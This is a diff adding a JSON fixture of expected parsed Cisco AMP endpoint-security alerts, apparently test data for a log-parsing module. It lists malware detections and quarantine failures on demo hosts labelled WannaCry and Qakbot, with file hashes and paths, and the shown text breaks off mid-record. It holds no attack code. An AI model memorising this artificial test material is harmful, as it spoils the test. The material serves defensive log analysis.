@@ -1,0 +1,3234 @@
+[
+    {
+        "@timestamp": "2021-01-14T17:39:50.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "W32.Variant:Gen.20gl.1201",
+        "cisco.amp.detection_id": "6419275394960064595",
+        "cisco.amp.event_type_id": 1090519054,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.file.parent.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 96000000,
+        "event.action": "Threat Detected",
+        "event.category": [
+            "file",
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419275394960065000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.md5": "84c82835a5d21bbcf75a61706d8ab549",
+        "file.hash.sha1": "5ff465afaabcbf0150d1a3ab2c2e74f3a4426467",
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "file.name": "tasksche.exe",
+        "file.path": "\\\\?\\C:\\Windows\\tasksche.exe",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "host.os.family": "windows",
+        "host.os.platform": "windows",
+        "host.user.name": "user@testdomain.com",
+        "input.type": "log",
+        "log.offset": 0,
+        "process.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "process.name": "mssecsvc.exe",
+        "process.pid": 6404,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+            "84c82835a5d21bbcf75a61706d8ab549",
+            "5ff465afaabcbf0150d1a3ab2c2e74f3a4426467"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "related.user": [
+            "user@testdomain.com"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T17:39:50.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "W32.Variant:Gen.20gl.1201",
+        "cisco.amp.detection_id": "6419275394960064594",
+        "cisco.amp.event_type_id": 1090519054,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 33000000,
+        "event.action": "Threat Detected",
+        "event.category": [
+            "file",
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419275394960065000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "file.name": "mssecsvc.exe",
+        "file.path": "\\\\?\\C:\\Windows\\mssecsvc.exe",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "host.os.family": "windows",
+        "host.os.platform": "windows",
+        "host.user.name": "user@testdomain.com",
+        "input.type": "log",
+        "log.offset": 1522,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "related.user": [
+            "user@testdomain.com"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T17:39:49.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419275390665097297",
+        "cisco.amp.error.description": "Delete pending",
+        "cisco.amp.error.error_code": 3221225558,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 862000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419275390665097000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 3902,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T17:39:49.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419275390665097295",
+        "cisco.amp.error.description": "Cannot delete",
+        "cisco.amp.error.error_code": 3221225761,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 659000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419275390665097000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 5088,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T17:39:49.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "W32.Gen.20gl.1201",
+        "cisco.amp.detection_id": "6419275390665097296",
+        "cisco.amp.event_type_id": 1090519054,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.file.parent.disposition": "Clean",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 706000000,
+        "event.action": "Threat Detected",
+        "event.category": [
+            "file",
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419275390665097000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.md5": "db349b97c37d22f5ea1d1841e3c89eb4",
+        "file.hash.sha1": "e889544aff85ffaf8b0d0da705105dee7c97fe26",
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "file.name": "mssecsvc.exe",
+        "file.path": "\\\\?\\C:\\WINDOWS\\mssecsvc.exe",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "host.os.family": "windows",
+        "host.os.platform": "windows",
+        "host.user.name": "user@testdomain.com",
+        "input.type": "log",
+        "log.offset": 7527,
+        "process.hash.md5": "4e568dbe3fff1a0025eb432dc929b78f",
+        "process.hash.sha1": "7abcc82dc5a05b4f53fd0fbd386738e5555025cf",
+        "process.hash.sha256": "26f36ca31a1b977685f8df5f8436848b7d4143b47ec0dae68f8382c1b52a6c71",
+        "process.name": "lsass.exe",
+        "process.pid": 708,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+            "db349b97c37d22f5ea1d1841e3c89eb4",
+            "e889544aff85ffaf8b0d0da705105dee7c97fe26"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "related.user": [
+            "user@testdomain.com"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:59:38.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "f9:65:da:22:2a:41"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6411525251028484105",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "f9:65:da:22:2a:41"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 698000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6411525251028484000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "bac7bc52812bc63745d4c5904d18e1581e4f0c821b4cf8336c8dd8eab86385ff",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_1",
+        "host.name": "Demo_Qakbot_1",
+        "input.type": "log",
+        "log.offset": 11843,
+        "related.hash": [
+            "bac7bc52812bc63745d4c5904d18e1581e4f0c821b4cf8336c8dd8eab86385ff"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_1"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:59:38.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "f9:65:da:22:2a:41"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "W32.File.MalParent",
+        "cisco.amp.detection_id": "6411525251028484104",
+        "cisco.amp.event_type_id": 1090519054,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "f9:65:da:22:2a:41"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 183000000,
+        "event.action": "Threat Detected",
+        "event.category": [
+            "file",
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6411525251028484000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.md5": "6894b3834bd541fa85df79e44568acac",
+        "file.hash.sha1": "8cf0ca99a8f5019d8583133b9a9379299c45470c",
+        "file.hash.sha256": "bac7bc52812bc63745d4c5904d18e1581e4f0c821b4cf8336c8dd8eab86385ff",
+        "file.name": "MspthrdHash.exe",
+        "file.path": "\\\\?\\C:\\Users\\johndoe\\AppData\\Local\\MspthrdHash\\MspthrdHash.exe",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_1",
+        "host.name": "Demo_Qakbot_1",
+        "host.os.family": "windows",
+        "host.os.platform": "windows",
+        "host.user.name": "user@testdomain.com",
+        "input.type": "log",
+        "log.offset": 14401,
+        "related.hash": [
+            "bac7bc52812bc63745d4c5904d18e1581e4f0c821b4cf8336c8dd8eab86385ff",
+            "6894b3834bd541fa85df79e44568acac",
+            "8cf0ca99a8f5019d8583133b9a9379299c45470c"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_1"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "related.user": [
+            "user@testdomain.com"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:55:47.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419264043361501262",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 888000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419264043361501000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 16886,
+        "related.hash": [
+            "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:55:47.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229331435814969",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 779000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419264043361501000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 18098,
+        "related.hash": [
+            "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:55:47.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419204905956802579",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 716000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419264043361501000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 19310,
+        "related.hash": [
+            "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:55:47.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419264043361501261",
+        "cisco.amp.event_type_id": 553648155,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 888000000,
+        "event.action": "Retrospective Quarantine",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419264043361501000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 20522,
+        "related.hash": [
+            "b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:55:46.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229322845880359",
+        "cisco.amp.error.description": "Cannot delete",
+        "cisco.amp.error.error_code": 3221225761,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 718000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419264039066534000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 26735,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:55:46.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419264039066533964",
+        "cisco.amp.event_type_id": 553648155,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 765000000,
+        "event.action": "Retrospective Quarantine",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419264039066534000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 27939,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:35:01.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6412622782676336648",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 729000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412622782676337000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "input.type": "log",
+        "log.offset": 31703,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:35:01.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6412622782676336647",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 729000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412622782676337000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "input.type": "log",
+        "log.offset": 32904,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:35:01.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6412622782676336646",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 713000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412622782676337000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "input.type": "log",
+        "log.offset": 34105,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
